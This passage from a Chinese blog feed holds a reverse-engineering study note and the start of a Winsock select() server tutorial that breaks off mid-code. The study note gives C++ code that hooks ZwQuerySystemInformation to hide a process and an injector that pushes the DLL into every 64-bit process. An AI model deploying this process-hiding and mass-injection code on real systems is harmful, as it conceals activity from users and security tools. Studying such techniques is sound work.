lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setProcName</span>(<span class="string">L&quot;Notepad.exe&quot;</span>);</span><br><span class="line"><span class="function">std::string <span class="title">curProc</span><span class="params">(MAX_PATH, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">GetModuleFileNameA</span>(<span class="literal">nullptr</span>, &amp;curProc[<span class="number">0</span>], curProc.<span class="built_in">size</span>());</span><br><span class="line">p = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(<span class="built_in">strrchr</span>(curProc.<span class="built_in">c_str</span>(), <span class="string">&#x27;\\&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">nullptr</span> &amp;&amp; !_stricmp(p + <span class="number">1</span>, <span class="string">&quot;DLL_inject.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">/*CreateThread(nullptr, 0, startHide, nullptr, 0, nullptr);*/</span></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注入器本来应该实现全局注入，但是由于我这边不知道为什么一注就挂，所以就没有全局，只单独选择了exploer，这里的代码和之前的是一样的，如果想继续测试全局注入，可以试试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Is64BitProcess</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL isWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsWow64Process</span>(hProcess, &amp;isWow64)) &#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !isWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// 取得对应 PID 句柄</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Memory allocation failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;WriteProcessMemory failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetModuleHandle failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetProcAddress failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateRemoteThread failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;DLL injected successfully into process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectAllProcesses</span><span class="params">(LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateToolhelp32Snapshot failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (pe.th32ProcessID &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Is64BitProcess</span>(pe.th32ProcessID)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping 32-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pe.szExeFile, <span class="string">L&quot;StartMenuExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;ShellExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;LockApp.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Attempting to inject into 64-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>(pe.th32ProcessID, szDllPath)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Successfully injected into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Failed to inject into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Process32First failed\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="comment">//if (argc != 2) &#123;</span></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;USAGE: %s dll_path\n&quot;), argv[0]);</span></span><br><span class="line"><span class="comment">//return 1;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">TCHAR dllpath[] = <span class="string">L&quot;xxx\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">injectAllProcesses</span>(dllpath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是64位，不能用taskmgr测试QAQ，所以写了一个测试程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 获取 ZwQuerySystemInformation 函数地址</span></span><br><span class="line"><span class="comment">//setProcName(L&quot;notepad.exe&quot;);</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(</span><br><span class="line"><span class="built_in">getProc</span>(<span class="string">&quot;Ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (pZwQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to get ZwQuerySystemInformation address!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hookByCode(&quot;Ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, reinterpret_cast&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[0]);</span></span><br><span class="line"><span class="comment">// 定义缓冲区大小</span></span><br><span class="line">ULONG bufferSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 初始缓冲区大小（1MB）</span></span><br><span class="line">PVOID buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 ZwQuerySystemInformation</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line"><span class="keyword">while</span> ((status = <span class="built_in">pZwQuerySystemInformation</span>(</span><br><span class="line"><span class="number">5</span>, <span class="comment">// SystemProcessInformation</span></span><br><span class="line">buffer,</span><br><span class="line">bufferSize,</span><br><span class="line">&amp;bufferSize</span><br><span class="line">)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line"><span class="comment">// 如果缓冲区不够大，重新分配更大的缓冲区</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line">bufferSize *= <span class="number">2</span>;</span><br><span class="line">buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ZwQuerySystemInformation failed with status: &quot;</span> &lt;&lt; status &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历进程信息</span></span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(buffer);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 输出进程ID和进程名</span></span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;Process ID: &quot;</span> &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(pProcessInfo-&gt;UniqueProcessId)</span><br><span class="line">&lt;&lt; <span class="string">&quot;, Process Name: &quot;</span> &lt;&lt; (pProcessInfo-&gt;ImageName.Buffer ? pProcessInfo-&gt;ImageName.Buffer : <span class="string">L&quot;Unknown&quot;</span>)</span><br><span class="line">&lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移动到下一个进程</span></span><br><span class="line"><span class="keyword">if</span> (pProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(pProcessInfo) + pProcessInfo-&gt;NextEntryOffset</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放缓冲区</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，notepad可以隐藏</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网路编程2-SELECT</title>
      <link href="/posts/574e749a.html"/>
      <url>/posts/574e749a.html</url>
      
        <content type="html"><![CDATA[<h2 id="select">select</h2><p>select维护了一个监测队列，当我们把需要的文件描述符传入时，它就会主动监测其中的内容。</p><p>一般格式为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fd_set fdRead;<span class="comment">//监测队列</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);<span class="comment">//sock加入监测队列</span></span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);<span class="comment">//selectRes表明select是否监测到sock的活动</span></span><br></pre></td></tr></table></figure><p>由于服务器socket活动时表明有新连接<br>客户端socket活动时表明有数据发送，<br>所以通过这个区别来添加新客户端和发送信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// 无限循环，持续处理事件</span></span><br><span class="line">        <span class="comment">// 1. 初始化 fd_set，添加服务端套接字和所有客户端套接字</span></span><br><span class="line">        fd_set fdRead;</span><br><span class="line">        <span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line">        <span class="built_in">FD_SET</span>(servSock, &amp;fdRead);  <span class="comment">// 监控服务端套接字（新连接）</span></span><br><span class="line">        <span class="keyword">for</span> (SOCKET client : clientList) &#123;</span><br><span class="line">            <span class="built_in">FD_SET</span>(client, &amp;fdRead);  <span class="comment">// 监控所有客户端套接字（数据到达）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 调用 select，设置超时时间为 1 秒</span></span><br><span class="line">        timeval tv&#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 处理 select 结果</span></span><br><span class="line">        <span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>) &#123;  <span class="comment">// 有套接字活动</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i) &#123;  <span class="comment">// 遍历活跃的套接字</span></span><br><span class="line">                SOCKET activeSock = fdRead.fd_array[i];</span><br><span class="line">                <span class="keyword">if</span> (activeSock == servSock) &#123;  <span class="comment">// 服务端套接字活跃：新连接</span></span><br><span class="line">                    SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clntSock == INVALID_SOCKET) &#123;</span><br><span class="line">                        std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    clientList.<span class="built_in">push_back</span>(clntSock);  <span class="comment">// 将新客户端加入列表</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 客户端套接字活跃：数据到达</span></span><br><span class="line">                    <span class="built_in">recvMsg</span>(fdRead, activeSock);  <span class="comment">// 接收并处理数据</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (selectRes == <span class="number">0</span>) &#123;  <span class="comment">// 超时，无活动</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;do something else&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// select 错误</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;select func error&quot;</span> &lt;&lt; <span class="built_in">WSAGetLastError</span>() &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此服务端完整代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Server.hpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 